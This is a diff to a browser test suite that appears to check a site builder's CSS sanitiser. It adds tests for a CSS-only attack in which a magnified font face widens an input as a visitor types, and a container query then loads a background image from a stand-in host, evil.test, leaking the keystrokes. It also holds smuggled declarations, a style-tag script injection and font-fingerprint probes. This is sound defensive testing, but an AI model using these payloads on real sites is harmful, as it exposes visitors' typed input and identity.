@@ -12,6 +12,7 @@ import { chromium, type Browser, type Page } from 'playwright';
 import { compile } from 'tailwindcss';
 import type { ComponentNode } from '@/lib/renderer/publish/hydrateBindings';
 import { FONT_LIBRARY } from '@/lib/fonts/registry';
+import { FIELD_SIZING_GUARD } from '@/lib/responsive/responsiveCss';
 import { PROPERTY_SYNTAXES, parseRule } from '@/lib/rules/rules';
 import { publishedDocument, renderPublished } from './lib/published';
 
@@ -204,7 +205,7 @@ describe('definitions in real Chromium', () => {
       const kept = await page.evaluate(() =>
         [...document.styleSheets].flatMap((sheet) => [...sheet.cssRules]).map((rule) => rule.constructor.name).sort(),
       );
-      expect(kept).toEqual(['CSSFontFeatureValuesRule', 'CSSFontPaletteValuesRule']);
+      expect(kept).toEqual(['CSSFontFeatureValuesRule', 'CSSFontPaletteValuesRule', 'CSSStyleRule']);
       expect(await box('n').evaluate((el) => getComputedStyle(el).fontPalette)).toBe('--u-warm');
     });
   });
@@ -294,6 +295,7 @@ describe('definitions in real Chromium', () => {
       ['a protocol-relative font', faceSrc('url(//evil.test/a.woff2)')],
       ['a tab in the slashes', faceSrc('url("/\t/evil.test/a.woff2")')],
       ['a font after a local one', faceSrc('local("Arial"), url(https://evil.test/a.woff2)')],
+      ['a font the visitor may have', faceSrc('local("Menlo-Regular")')],
       ['a font in format()', faceSrc('url(https://evil.test/a.woff2) format("woff2")')],
       ['src() with a string', faceSrc('src("https://evil.test/a.woff2")')],
       ['a keyframe background', frame({ backgroundImage: 'url(https://evil.test/k.png)' })],
@@ -333,6 +335,70 @@ describe('definitions in real Chromium', () => {
     });
   });
 
+  describe('what a visitor types, read through a width', () => {
+    const LEAK = 'https://evil.test/typed-a';
+    /** One face per character is what the attack stores. This one covers `a`, magnified. */
+    const magnifier = { id: 'ka', define: '@font-face', style: { fontFamily: 'u-ka', src: 'url(/regular.ttf)', unicodeRange: 'U+61', sizeAdjust: '9000%' } };
+
+    /**
+     * The payload of the security review of pull request 235: an input in a max-content
+     * column beside a sized container, and in that container a hidden node with an
+     * external background, which a rule shows once the column is wide.
+     */
+    const payload = (control: Record<string, unknown>, extraRules: unknown[] = []): ComponentNode =>
+      node('grid', { style: { display: 'grid', gridTemplateColumns: 'max-content' }, rules: [magnifier, ...extraRules] }, [
+        { id: 'field', type: 'input', props: { 'data-t': 'field', type: 'text', style: { fontFamily: 'u-ka', ...control } } } as ComponentNode,
+        node('box', { style: { containerType: 'inline-size' } }, [
+          node('leak', {
+            style: { display: 'none', width: '10px', height: '10px', backgroundImage: `url(${LEAK})` },
+            rules: [{ id: 'on', selector: '&', at: ['@container (min-width: 300px)'], style: { display: 'block' } }],
+          }),
+        ]),
+      ]);
+
+    const typeInto = async (text: string): Promise<number> => {
+      await box('field').pressSequentially(text);
+      await page.evaluate(() => document.fonts.ready);
+      await page.waitForTimeout(250);
+      return box('field').evaluate((el) => el.getBoundingClientRect().width);
+    };
+
+    it('fires without the guard, so the attack is real and the checks below can fail', async () => {
+      const published = renderPublished(payload({}));
+      const html = publishedDocument({ ...published, css: published.css.replace(FIELD_SIZING_GUARD, 'input{field-sizing:content}') });
+      await showDocument(html);
+      const before = await typeInto('xyz');
+      expect(requests).not.toContain(LEAK);
+      const after = await typeInto('a');
+      expect(after).toBeGreaterThan(before + 100);
+      expect(requests).toContain(LEAK);
+    });
+
+    it.each<[string, Record<string, unknown>, unknown[]]>([
+      ['the plain payload', {}, []],
+      ['Normal field-sizing', { fieldSizing: 'content' }, []],
+      ['Normal field-sizing, important', { fieldSizing: 'content!important' }, []],
+      ['field-sizing smuggled after a ;', { color: 'red;field-sizing:content!important' }, []],
+      ['field-sizing smuggled with an escape', { color: 'red;fi\\65ld-sizing:content!important' }, []],
+      ['a rule that outranks the guard', {}, [{ id: 'up', selector: '& input', style: { fieldSizing: 'content!important' } }]],
+      ['a keyframe', { animation: 'u-grow 1s forwards' }, [{ id: 'g', define: '@keyframes u-grow', blocks: [{ selector: 'to', style: { fieldSizing: 'content' } }] }]],
+    ])('sends nothing and keeps its width against %s', async (_, control, extraRules) => {
+      const css = await show(payload(control, extraRules));
+      expect(css.endsWith(FIELD_SIZING_GUARD)).toBe(true);
+      expect(await box('field').evaluate((el) => getComputedStyle(el).getPropertyValue('field-sizing'))).toBe('fixed');
+      const before = await typeInto('xyz');
+      const after = await typeInto('aaaa');
+      expect(after).toBe(before);
+      expect(requests).not.toContain(LEAK);
+    });
+
+    it('refuses the exact font of the review, so the fingerprint has nothing to measure', async () => {
+      const stored = { id: 'ka', define: '@font-face', style: { fontFamily: 'u-ka', src: 'local("Menlo-Regular")', unicodeRange: 'U+61', sizeAdjust: '3000%' } };
+      const css = await show(node('n', { style: { fontFamily: 'u-ka' }, children: 'a', rules: [stored] }));
+      expect(css).toBe('');
+    });
+  });
+
   describe('the <style> element', () => {
     it.each<[string, unknown]>([
       ['a name', { id: 'r', define: '@keyframes u-x</style><script>window.ran=1</script>', blocks: [{ selector: 'to', style: { opacity: 0 } }] }],
@@ -349,7 +415,7 @@ describe('definitions in real Chromium', () => {
       expect(css).toContain('\\3c /style>');
       expect(css).not.toContain('<');
       expect(await box('out').count()).toBe(0);
-      expect(await page.evaluate(() => [...document.styleSheets].flatMap((sheet) => [...sheet.cssRules]).length)).toBe(1);
+      expect(await page.evaluate(() => [...document.styleSheets].flatMap((sheet) => [...sheet.cssRules]).length)).toBe(2);
     });
   });
 });
